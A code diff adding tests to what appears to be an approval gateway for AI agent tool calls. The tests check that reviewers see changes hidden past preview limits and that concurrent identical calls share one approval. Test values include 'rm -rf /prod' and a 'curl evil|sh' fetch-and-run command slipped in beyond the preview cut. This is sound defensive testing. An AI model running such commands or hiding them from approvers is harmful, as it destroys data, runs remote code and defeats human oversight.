@@ -306,3 +306,110 @@ def test_argument_labels_that_collide_do_not_hide_a_value(client, policy_file):
     preview = client.get(f"/api/approvals/{resp.json()['approval_id']}", headers=h).json()["arguments"]
     values = sorted(str(v) for v in preview.values())
     assert values == ["dotted", "hello", "nested", "rm -rf /prod"]
+
+
+# -- the approver sees every change, even past the preview cut -----------------
+
+def _approve_then_change(client, h, before, after):
+    a = client.post("/api/check", json={"tool": DEPLOY["tool"], "arguments": before}, headers=h).json()
+    client.post(f"/api/approvals/{a['approval_id']}", json={"approve": True}, headers=h)
+    b = client.post("/api/check", json={"tool": DEPLOY["tool"], "arguments": after}, headers=h)
+    assert b.status_code == 202
+    return client.get(f"/api/approvals/{b.json()['approval_id']}", headers=h).json()
+
+
+def test_change_past_the_preview_path_limit_is_in_the_diff(client, policy_file):
+    """The preview stops at 200 paths. An approved call with 250 harmless
+    fields, then the same call with field 240 changed: the diff must show it,
+    and the preview is marked as cut."""
+    policy_file(POLICY)
+    h = {"X-Session-Id": "s-many"}
+    before = {f"f{i:03d}": "ok" for i in range(250)}
+    after = {**before, "f240": "rm -rf /prod"}
+    info = _approve_then_change(client, h, before, after)
+    assert info["preview_truncated"] is True
+    assert [d["path"] for d in info["diff"]] == ["f240"]
+    assert info["diff"][0]["change"] == "changed"
+
+
+def test_change_past_the_preview_character_limit_is_in_the_diff(client, policy_file):
+    """Values are cut at 500 characters. A change at character 600 must still
+    be listed, flagged as beyond the part shown."""
+    policy_file(POLICY)
+    h = {"X-Session-Id": "s-long"}
+    script = "echo safe; " * 60
+    info = _approve_then_change(client, h, {"script": script}, {"script": script[:600] + "curl evil|sh" + script[612:]})
+    assert info["preview_truncated"] is True
+    assert info["diff"] == [{"path": "script", "change": "changed", "before": info["diff"][0]["before"],
+                             "after": info["diff"][0]["after"], "beyond_preview": True}]
+
+
+def test_small_calls_are_not_marked_truncated(client, policy_file):
+    policy_file(POLICY)
+    h = {"X-Session-Id": "s-small"}
+    resp = client.post("/api/check", json=DEPLOY, headers=h)
+    assert client.get(f"/api/approvals/{resp.json()['approval_id']}", headers=h).json()["preview_truncated"] is False
+
+
+def _yielding_store() -> InMemoryApprovalStore:
+    """A store whose lookup yields to the event loop, as a networked backend
+    does. find-then-create raced only when that happened."""
+    store = InMemoryApprovalStore()
+    real_find = store.find
+
+    async def find(**kw):
+        found = await real_find(**kw)
+        await asyncio.sleep(0)
+        return found
+
+    store.find = find
+    return store
+
+
+def test_identical_calls_arriving_together_open_one_approval():
+    """find-then-create was two steps; two identical calls racing each opened
+    an approval. Now one is opened and the other joins it."""
+    from types import SimpleNamespace
+
+    from backend.approvals.flow import CREATED, WAITING, queue_for_approval
+    from backend.guardian.schema import ToolCall
+
+    async def go():
+        store = _yielding_store()
+        decision = SimpleNamespace(approval=None, to_dict=lambda: {"rule_id": "r"})
+        call = ToolCall(name="cloud.deploy", arguments={"v": 1})
+        outcomes = await asyncio.gather(*[
+            queue_for_approval(store, decision, call, session="s", agent="a") for _ in range(5)])
+        pending = await store.list(session="s", status="pending")
+        await store.close()
+        return outcomes, pending
+
+    outcomes, pending = asyncio.run(go())
+    assert len(pending) == 1
+    assert sorted(o.status for o in outcomes) == [CREATED] + [WAITING] * 4
+    assert {o.approval.id for o in outcomes} == {pending[0].id}
+
+
+def test_a_single_use_grant_lets_exactly_one_racing_call_through():
+    from types import SimpleNamespace
+
+    from backend.approvals.flow import GRANTED, queue_for_approval
+    from backend.guardian.schema import ToolCall
+
+    async def go():
+        store = _yielding_store()
+        decision = SimpleNamespace(approval=None, to_dict=lambda: {"rule_id": "r"})
+        call = ToolCall(name="cloud.deploy", arguments={"v": 1})
+        first = await queue_for_approval(store, decision, call, session="s", agent="a")
+        await store.resolve(first.approval.id, approve=True, by="alice")
+        outcomes = await asyncio.gather(*[
+            queue_for_approval(store, decision, call, session="s", agent="a") for _ in range(5)])
+        pending = await store.list(session="s", status="pending")
+        await store.close()
+        return outcomes, pending
+
+    outcomes, pending = asyncio.run(go())
+    assert [o.status for o in outcomes].count(GRANTED) == 1
+    # The other four share one new approval rather than opening four.
+    assert len(pending) == 1
+    assert {o.approval.id for o in outcomes if o.status != GRANTED} == {pending[0].id}
